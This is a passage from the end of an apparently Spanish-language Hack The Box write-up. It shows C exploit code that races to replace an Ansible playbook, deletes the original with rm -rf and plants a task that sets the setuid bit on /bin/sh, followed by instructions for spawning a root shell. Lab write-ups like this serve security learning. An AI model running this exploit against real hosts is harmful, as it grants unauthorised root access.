<span class=line><span style=color:#6a737d>#define PLAYBOOK "- hosts: localhost\n"\</span></span>
<span class=line><span style=color:#b392f0>                 "  tasks:\n"</span><span style=color:#b392f0>\</span></span>
<span class=line><span style=color:#9ecbff>                 "  - name: pwn\n"</span><span style=color:#79b8ff>\</span></span>
<span class=line><span style=color:#9ecbff>                 "    ansible.builtin.shell: chmod +s /bin/sh\n"</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>void</span><span style=color:#9ecbff> replace</span><span style=color:#e1e4e8>() </span><span style=color:#9ecbff>{</span></span>
<span class=line><span style=color:#b392f0>  struct</span><span style=color:#9ecbff> stat</span><span style=color:#9ecbff> sb</span><span style=color:#e1e4e8>;</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>  while(1</span><span style=color:#e1e4e8>) {</span></span>
<span class=line><span style=color:#f97583>    if</span><span style=color:#e1e4e8> (</span><span style=color:#79b8ff>stat</span><span style=color:#e1e4e8>(</span><span style=color:#9ecbff>PLAYBOOK_PATH,</span><span style=color:#e1e4e8> &#x26;</span><span style=color:#b392f0>sb</span><span style=color:#e1e4e8>) </span><span style=color:#f97583>!</span><span style=color:#9ecbff>=</span><span style=color:#79b8ff> 0</span><span style=color:#e1e4e8>) {</span></span>
<span class=line><span style=color:#f97583>      if</span><span style=color:#e1e4e8> (</span><span style=color:#b392f0>mkdir(PLAYBOOK_PATH,</span><span style=color:#79b8ff> 0700</span><span style=color:#e1e4e8>) </span><span style=color:#9ecbff>==</span><span style=color:#79b8ff> 0</span><span style=color:#e1e4e8>) {</span></span>
<span class=line><span style=color:#b392f0>        puts(</span><span style=color:#b392f0>"Swapped with directory!"</span><span style=color:#e1e4e8>);</span></span>
<span class=line><span style=color:#f97583>        return</span><span style=color:#e1e4e8>;</span></span>
<span class=line><span style=color:#e1e4e8>      }</span></span>
<span class=line><span style=color:#b392f0>      puts(</span><span style=color:#b392f0>"Fail!"</span><span style=color:#e1e4e8>);</span></span>
<span class=line><span style=color:#b392f0>      sleep(110</span><span style=color:#e1e4e8>);</span></span>
<span class=line><span style=color:#e1e4e8>    }</span></span>
<span class=line><span style=color:#b392f0>    usleep(100</span><span style=color:#e1e4e8>);</span></span>
<span class=line><span style=color:#e1e4e8>  }</span></span>
<span class=line><span style=color:#e1e4e8>}</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>void</span><span style=color:#9ecbff> plant</span><span style=color:#e1e4e8>() </span><span style=color:#9ecbff>{</span></span>
<span class=line><span style=color:#b392f0>  FILE</span><span style=color:#79b8ff> *</span><span style=color:#9ecbff>file</span><span style=color:#e1e4e8>;</span></span>
<span class=line><span style=color:#f97583>  if</span><span style=color:#e1e4e8> (</span><span style=color:#b392f0>file</span><span style=color:#9ecbff> =</span><span style=color:#9ecbff> fopen</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>PLAYBOOK_PATH,</span><span style=color:#9ecbff> "w"</span><span style=color:#e1e4e8>)) {</span></span>
<span class=line><span style=color:#b392f0>    fprintf(file,</span><span style=color:#9ecbff> "%s",</span><span style=color:#9ecbff> PLAYBOOK</span><span style=color:#e1e4e8>);</span></span>
<span class=line><span style=color:#b392f0>    fclose(file</span><span style=color:#e1e4e8>);</span></span>
<span class=line><span style=color:#e1e4e8>  }</span></span>
<span class=line><span style=color:#e1e4e8>}</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>int</span><span style=color:#9ecbff> main</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>int</span><span style=color:#9ecbff> argc,</span><span style=color:#9ecbff> char</span><span style=color:#79b8ff>*</span><span style=color:#9ecbff> argv[]</span><span style=color:#e1e4e8>) </span><span style=color:#9ecbff>{</span></span>
<span class=line><span style=color:#b392f0>  replace</span><span style=color:#e1e4e8>();</span></span>
<span class=line><span style=color:#b392f0>  sleep(10</span><span style=color:#e1e4e8>);</span></span>
<span class=line><span style=color:#b392f0>  system(</span><span style=color:#b392f0>"rm -rf /opt/automation/tasks/playbook_1.yml"</span><span style=color:#e1e4e8>);</span></span>
<span class=line><span style=color:#b392f0>  plant</span><span style=color:#e1e4e8>();</span></span>
<span class=line><span style=color:#b392f0>  puts(</span><span style=color:#b392f0>"Done!"</span><span style=color:#e1e4e8>);</span></span>
<span class=line><span style=color:#f97583>  return</span><span style=color:#79b8ff> 0</span><span style=color:#e1e4e8>;</span></span>
<span class=line><span style=color:#e1e4e8>}</span></span>
<span class=line></span></code></pre><p>Ejecutar el ejecutable compilado en el objetivo debería reemplazar el archivo con nuestro playbook malicioso después de un par de minutos. A continuación, esperamos otro par de minutos y ejecutamos /bin/sh -pi para generar un intérprete de comandos raíz.</p></div></div></div><div class="flex w-full gap-4 flex-col mb-4 justify-between md:flex-row overflow-hidden"><a href=/posts/devvortex/ class="w-full active:scale-95 font-bold overflow-hidden"><div class="flex items-center w-full justify-start btn-card gap-4 h-[3.75rem] max-w-full px-4 rounded-2xl"><svg data-icon=material-symbols:chevron-left-rounded height=1em viewBox="0 0 24 24" width=1em class="text-[var(--primary)] text-[2rem]"><symbol id=ai:material-symbols:chevron-left-rounded><path d="m10.8 12l3.9 3.9q.275.275.275.7t-.275.7t-.7.275t-.7-.275l-4.6-4.6q-.15-.15-.212-.325T8.425 12t.063-.375t.212-.325l4.6-4.6q.275-.275.7-.275t.7.275t.275.7t-.275.7z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:chevron-left-rounded></use></svg><div class="transition whitespace-nowrap dark:text-white/75 max-w-[calc(100%_-_3rem)] overflow-ellipsis overflow-hidden text-black/75">Devvortex HTB Writeup</div></div></a><a href=/posts/keeper/ class="w-full active:scale-95 font-bold overflow-hidden"><div class="flex items-center w-full btn-card gap-4 h-[3.75rem] max-w-full px-4 rounded-2xl justify-end"><div class="transition whitespace-nowrap dark:text-white/75 max-w-[calc(100%_-_3rem)] overflow-ellipsis overflow-hidden text-black/75">Keeper HTB Writeup</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="text-[var(--primary)] text-[2rem]"><symbol id=ai:material-symbols:chevron-right-rounded><path d="M12.6 12L8.7 8.1q-.275-.275-.275-.7t.275-.7t.7-.275t.7.275l4.6 4.6q.15.15.213.325t.062.375t-.062.375t-.213.325l-4.6 4.6q-.275.275-.7.275t-.7-.275t-.275-.7t.275-.7z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg></div></a></div></main></div><div class="onload-animation col-span-2 grid-rows-3 mt-4" id=footer><div class="flex items-center card-base max-w-[var(--page-width)] mx-auto min-h-[4.5rem] px-6 rounded-b-none"><div class="transition text-50 text-sm">© 2022 Mil4ne. Todos los derechos reservados.<br>Desarrollado por <a href="https://github.com/mil4ne?tab=repositories" class="text-[var(--primary)] font-medium link" target=_blank>Mil4ne</a></div></div></div><div class="back-to-top-wrapper hidden lg:block" data-astro-cid-eymb5ayk><div class="transition flex items-center back-to-top-btn hide overflow-hidden rounded-2xl" id=back-to-top-btn data-astro-cid-eymb5ayk onclick=backToTop()><button class="w-[3.75rem] btn-card h-[3.75rem]" aria-label="Back to Top" data-astro-cid-eymb5ayk><svg data-icon=material-symbols:keyboard-arrow-up-rounded height=1em viewBox="0 0 24 24" width=1em class=mx-auto data-astro-cid-eymb5ayk><symbol id=ai:material-symbols:keyboard-arrow-up-rounded><path d="m12 10.8l-3.9 3.9q-.275.275-.7.275t-.7-.275t-.275-.7t.275-.7l4.6-4.6q.3-.3.7-.3t.7.3l4.6 4.6q.275.275.275.7t-.275.7t-.7.275t-.7-.275z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:keyboard-arrow-up-rounded></use></svg></button></div></div><script>function backToTop(){window.scroll({top:0,behavior:"smooth"})}function scrollFunction(){let o=document.getElementById("back-to-top-btn");document.body.scrollTop>600||document.documentElement.scrollTop>600?o.classList.remove("hide"):o.classList.add("hide")}window.onscroll=scrollFunction</script></div></div></body></html>